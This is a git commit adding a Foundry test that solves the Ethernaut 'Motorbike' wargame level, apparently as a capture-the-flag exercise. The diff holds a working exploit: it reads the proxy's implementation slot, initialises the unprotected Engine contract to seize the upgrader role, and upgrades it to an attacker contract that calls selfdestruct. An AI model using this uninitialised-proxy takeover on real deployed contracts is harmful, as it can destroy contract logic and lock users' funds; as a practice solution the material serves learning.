aadb586306712f0a303de99ddd6de90cc82e54e4
easonnong <nongeason@gmail.com>
2023-03-27 16:09:59 +0800

    motorbike done

--- test/Motorbike.t.sol
+++ test/Motorbike.t.sol
@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.10;
+pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import "../src/Motorbike/Motorbike.sol";
@@ -18,7 +18,7 @@ contract MotorbikeTest is Test {
         _ethernaut.registerLevel(_motorbikeFactory);
         vm.startPrank(_hacker);
         address instance = _ethernaut.createLevelInstance(_motorbikeFactory);
-        _motorbike = Motorbike(instance);
+        _motorbike = Motorbike(payable(instance));
         _;
         bool success = _ethernaut.submitLevelInstance(
             payable(address(_motorbike))
@@ -32,5 +32,34 @@ contract MotorbikeTest is Test {
         _motorbikeFactory = new MotorbikeFactory();
     }
 
-    function testMotorbikeHack() public testWrapper {}
+    function testIsMotorbikeCleared() public testWrapper {
+        address instance = address(_motorbike);
+        bytes32 _IMPLEMENTATION_SLOT = vm.load(
+            instance,
+            bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
+        );
+        address engine_ = address(uint160(uint256(_IMPLEMENTATION_SLOT)));
+
+        Engine engine = Engine(engine_);
+        engine.initialize();
+
+        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker();
+
+        require(Address.isContract(engine_), "engine_ is not a contract");
+
+        engine.upgradeToAndCall(
+            address(motorbikeAttacker),
+            abi.encodeWithSignature("breakEngine()")
+        );
+
+        engine.upgrader();
+
+        require(!Address.isContract(engine_), "engine_ is still a contract");
+    }
+}
+
+contract MotorbikeAttacker {
+    function breakEngine() external {
+        selfdestruct(payable(msg.sender));
+    }
 }
